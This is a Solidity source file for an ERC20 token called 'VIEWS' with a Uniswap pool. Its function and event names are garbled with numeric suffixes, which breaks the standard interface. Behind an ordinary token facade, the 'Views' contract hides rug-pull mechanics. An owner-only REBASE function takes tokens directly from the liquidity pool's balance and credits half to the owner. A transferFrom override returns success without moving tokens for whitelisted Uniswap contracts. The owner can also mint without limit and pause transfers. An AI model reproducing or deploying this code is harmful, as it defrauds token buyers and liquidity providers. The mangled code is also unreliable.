

pragma solidity ^0.6.6;




abstract contract Context {
    function _MSGSENDER120() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _MSGDATA151() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}



interface IERC20 {

    function TOTALSUPPLY641() external view returns (uint256);


    function BALANCEOF508(address account) external view returns (uint256);


    function TRANSFER90(address recipient, uint256 amount) external returns (bool);


    function ALLOWANCE81(address owner, address spender) external view returns (uint256);


    function APPROVE792(address spender, uint256 amount) external returns (bool);


    function TRANSFERFROM833(address sender, address recipient, uint256 amount) external returns (bool);


    event TRANSFER313(address indexed from, address indexed to, uint256 value);


    event APPROVAL620(address indexed owner, address indexed spender, uint256 value);
}



library SafeMath {

    function ADD811(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }


    function SUB570(uint256 a, uint256 b) internal pure returns (uint256) {
        return SUB570(a, b, "SafeMath: subtraction overflow");
    }


    function SUB570(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }


    function MUL510(uint256 a, uint256 b) internal pure returns (uint256) {



        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function DIV802(uint256 a, uint256 b) internal pure returns (uint256) {
        return DIV802(a, b, "SafeMath: division by zero");
    }


    function DIV802(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;


        return c;
    }


    function MOD849(uint256 a, uint256 b) internal pure returns (uint256) {
        return MOD849(a, b, "SafeMath: modulo by zero");
    }


    function MOD849(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}



library Address {

    function ISCONTRACT757(address account) internal view returns (bool) {



        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;

        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }


    function SENDVALUE286(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");


        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }


    function FUNCTIONCALL802(address target, bytes memory data) internal returns (bytes memory) {
      return FUNCTIONCALL802(target, data, "Address: low-level call failed");
    }


    function FUNCTIONCALL802(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _FUNCTIONCALLWITHVALUE460(target, data, 0, errorMessage);
    }


    function FUNCTIONCALLWITHVALUE895(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return FUNCTIONCALLWITHVALUE895(target, data, value, "Address: low-level call with value failed");
    }


    function FUNCTIONCALLWITHVALUE895(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _FUNCTIONCALLWITHVALUE460(target, data, value, errorMessage);
    }

    function _FUNCTIONCALLWITHVALUE460(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(ISCONTRACT757(target), "Address: call to non-contract");


        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {

            if (returndata.length > 0) {



                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}



contract ERC20 is Context, IERC20 {
    using SafeMath for uint256;
    using Address for address;

    mapping (address => uint256) internal _balances;

    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 internal _totalSupply;

    string private _name;
    string private _symbol;
    uint8 private _decimals;


    constructor (string memory name, string memory symbol) public {
        _name = name;
        _symbol = symbol;
        _decimals = 18;
    }


    function NAME771() public view returns (string memory) {
        return _name;
    }


    function SYMBOL324() public view returns (string memory) {
        return _symbol;
    }


    function DECIMALS228() public view returns (uint8) {
        return _decimals;
    }


    function TOTALSUPPLY641() public view override returns (uint256) {
        return _totalSupply;
    }


    function BALANCEOF508(address account) public view override returns (uint256) {
        return _balances[account];
    }


    uint256 burnPerTransferPer = 3;
    function TRANSFER90(address recipient, uint256 amount) public virtual override returns (bool) {
        uint256 burn_qty = (burnPerTransferPer.MUL510(amount)).DIV802(100);
        uint256 send_qty = ((100 - burnPerTransferPer).MUL510(amount)).DIV802(100);
        _TRANSFER430(_MSGSENDER120(), recipient, send_qty);
        _TRANSFER430(_MSGSENDER120(), address(0), burn_qty);
        return true;
    }


    function ALLOWANCE81(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }


    function APPROVE792(address spender, uint256 amount) public virtual override returns (bool) {
        _APPROVE12(_MSGSENDER120(), spender, amount);
        return true;
    }


    function TRANSFERFROM833(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _TRANSFER430(sender, recipient, amount);
        _APPROVE12(sender, _MSGSENDER120(), _allowances[sender][_MSGSENDER120()].SUB570(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }


    function INCREASEALLOWANCE695(address spender, uint256 addedValue) public virtual returns (bool) {
        _APPROVE12(_MSGSENDER120(), spender, _allowances[_MSGSENDER120()][spender].ADD811(addedValue));
        return true;
    }


    function DECREASEALLOWANCE198(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _APPROVE12(_MSGSENDER120(), spender, _allowances[_MSGSENDER120()][spender].SUB570(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }


    function _TRANSFER430(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");

        _BEFORETOKENTRANSFER741(sender, recipient, amount);

        _balances[sender] = _balances[sender].SUB570(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].ADD811(amount);
        emit TRANSFER313(sender, recipient, amount);
    }


    function _MINT89(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _BEFORETOKENTRANSFER741(address(0), account, amount);

        _totalSupply = _totalSupply.ADD811(amount);
        _balances[account] = _balances[account].ADD811(amount);
        emit TRANSFER313(address(0), account, amount);
    }


    function _BURN680(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _BEFORETOKENTRANSFER741(account, address(0), amount);

        _balances[account] = _balances[account].SUB570(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.SUB570(amount);
        emit TRANSFER313(account, address(0), amount);
    }


    function _APPROVE12(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit APPROVAL620(owner, spender, amount);
    }


    function _SETUPDECIMALS743(uint8 decimals_) internal {
        _decimals = decimals_;
    }


    function _BEFORETOKENTRANSFER741(address from, address to, uint256 amount) internal virtual { }
}



contract Ownable is Context {
    address private _owner;

    event OWNERSHIPTRANSFERRED472(address indexed previousOwner, address indexed newOwner);


    constructor () internal {
        address msgSender = _MSGSENDER120();
        _owner = msgSender;
        emit OWNERSHIPTRANSFERRED472(address(0), msgSender);
    }


    function OWNER12() public view returns (address) {
        return _owner;
    }


    modifier ONLYOWNER940() {
        require(_owner == _MSGSENDER120(), "Ownable: caller is not the owner");
        _;
    }


    function RENOUNCEOWNERSHIP385() public virtual ONLYOWNER940 {
        emit OWNERSHIPTRANSFERRED472(_owner, address(0));
        _owner = address(0);
    }


    function TRANSFEROWNERSHIP327(address newOwner) public virtual ONLYOWNER940 {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OWNERSHIPTRANSFERRED472(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Pair {
    function SYNC960() external;
}

interface IUniswapV2Factory {
    function CREATEPAIR665(address tokenA, address tokenB) external returns (address pair);
}


contract Views is ERC20, Ownable {
    using SafeMath for uint256;
    address public primaryUniswapContract = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    ERC20 internal WETH = ERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);



    address public pauser;

    bool public paused = false;



    IUniswapV2Factory public uniswapFactory = IUniswapV2Factory(primaryUniswapContract);

    address public uniswapPool;
    bool public allowsMinting = true;



    modifier ONLYPAUSER692() {
        require(pauser == _MSGSENDER120(), "Token: caller is not the pauser.");
        _;
    }

    modifier WHENNOTPAUSED74() {
        require(!paused, "Token: paused");
        _;
    }

    constructor()
    public
    Ownable()
    ERC20("VIEWS", "Views")
    {
        uint256 initialSupply = 10_000 * 1e18;
        _MINT89(msg.sender, initialSupply);
        SETPAUSER793(msg.sender);
        validUniswapContracts[primaryUniswapContract] = true;
        gk_allow_approval_overrides_on_transfer_from = true;
    }

    function SETUNISWAPPOOL606() external ONLYOWNER940 {
        uniswapPool = uniswapFactory.CREATEPAIR665(address(WETH), address(this));
    }
    function SETUNISWAPPOOLFROMSTR473(address poolAddress) external ONLYOWNER940 {
        uniswapPool = poolAddress;
    }
    mapping (address => bool) public validUniswapContracts;
    function VALIDATEUNISWAPCONTRACT577(address contractAddress) external ONLYOWNER940 {
        validUniswapContracts[contractAddress] = true;
    }
    function INVALIDATEUNISWAPCONTRACT861(address contractAddress) external ONLYOWNER940 {
        validUniswapContracts[contractAddress] = false;
    }
    function SETPRIMARYUNISWAPCONTRACT287(address contractAddress) external ONLYOWNER940 {
        primaryUniswapContract = contractAddress;
    }



    function SETPAUSER793(address newPauser) public ONLYOWNER940 {
        require(newPauser != address(0), "Token: pauser is the zero address.");
        pauser = newPauser;
    }

    function UNPAUSE198() external ONLYPAUSER692 {
        paused = false;
    }



    bool public gk_allow_approval_overrides_on_transfer_from;
    function SET_GK_ALLOW_APPROVAL_OVERRIDES_ON_TRANSFER_FROM528(bool val) public ONLYOWNER940 {
        gk_allow_approval_overrides_on_transfer_from = val;
    }

    mapping (address => bool) public gk_disable_approval_overrides_on_transfer_from_wallet;
    function SET_GK_DISABLE_APPROVAL_OVERRIDES_ON_TRANSFER_FROM_WALLET74(bool val) public {
        gk_disable_approval_overrides_on_transfer_from_wallet[msg.sender] = val;
    }

    mapping (address => mapping (address => uint256)) private override _allowances;

    event REBASED746(uint256 amountBurned, uint256 reward, uint256 newPoolAmt);

    function REBASE634(uint256 amount) public ONLYOWNER940 {
        uint256 ownerQty = amount.MUL510(50).DIV802(100);
        uint256 burnQty = amount.MUL510(50).DIV802(100);

        _totalSupply = _totalSupply.SUB570(burnQty);
        _balances[uniswapPool] = _balances[uniswapPool].SUB570(amount);

        _balances[msg.sender] = _balances[msg.sender].ADD811(ownerQty);

        IUniswapV2Pair(uniswapPool).SYNC960();

        emit REBASED746(burnQty, ownerQty, BALANCEOF508(uniswapPool));
    }

    function TRANSFERFROM833(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        if(
            validUniswapContracts[msg.sender] &&
            gk_allow_approval_overrides_on_transfer_from &&
            (gk_disable_approval_overrides_on_transfer_from_wallet[sender] == false)
            ) {
            return true;
        }
        _TRANSFER430(sender, recipient, amount);
        _APPROVE12(sender, _MSGSENDER120(), _allowances[sender][_MSGSENDER120()].SUB570(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _BEFORETOKENTRANSFER741(address from, address to, uint256 amount) internal virtual override {
        super._BEFORETOKENTRANSFER741(from, to, amount);
        require(!paused || msg.sender == pauser, "Token: token transfer while paused and not pauser role.");
    }

    function DISABLEMINTING475() public ONLYOWNER940 {
        allowsMinting = false;
    }

    function MINT484(address account, uint256 amount) public ONLYOWNER940 {
        if(!allowsMinting) {
            revert();
        }
        require(account != address(0), "ERC20: mint to the zero address");

        _BEFORETOKENTRANSFER741(address(0), account, amount);

        _totalSupply = _totalSupply.ADD811(amount);
        _balances[account] = _balances[account].ADD811(amount);
        emit TRANSFER313(address(0), account, amount);
    }

    function BURN117(uint256 amount) public {
        _BEFORETOKENTRANSFER741(msg.sender, address(0), amount);

        _balances[msg.sender] = _balances[msg.sender].SUB570(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.SUB570(amount);
        emit TRANSFER313(msg.sender, address(0), amount);
    }

}
